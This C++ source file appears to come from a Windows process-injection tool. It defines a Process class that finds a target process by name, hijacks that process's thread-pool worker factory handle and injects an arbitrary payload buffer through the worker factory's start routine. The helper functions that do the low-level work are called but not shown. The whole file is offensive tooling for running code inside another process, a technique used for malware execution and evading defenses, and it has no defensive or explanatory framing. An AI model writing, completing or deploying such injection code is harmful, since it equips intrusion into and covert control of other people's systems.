#include "include/Process.h"

bool Process::ProcessWorkerFactoryInject(unsigned char* data, size_t dataSize) {

	if (!isInitialized || hijackType != TpWorkerFactory) {
		return false;
	}

	return InjectViaWorkerFactoryStartRoutine(processHandle, handleToHijack, data, dataSize);
}


bool Process::init() {

	//
	// Find Target process
	//

	processHandle = enumerateProcess(name, &PID);
	if (processHandle == INVALID_HANDLE_VALUE) {

		return false;
	}


	//
	// Hijack Handle
	//

	switch (this->hijackType) {

	case TpWorkerFactory:
		handleToHijack = hijackProcessWorkerFactory(processHandle);
		break;

	default:
		return false;
	}

	if (handleToHijack == INVALID_HANDLE_VALUE) {

		return false;
	}



	return (isInitialized = true);
}


Process::~Process() {

	if (handleToHijack) {
		CloseHandle(handleToHijack);
	}

	if (processHandle) {
		CloseHandle(processHandle);
	}
}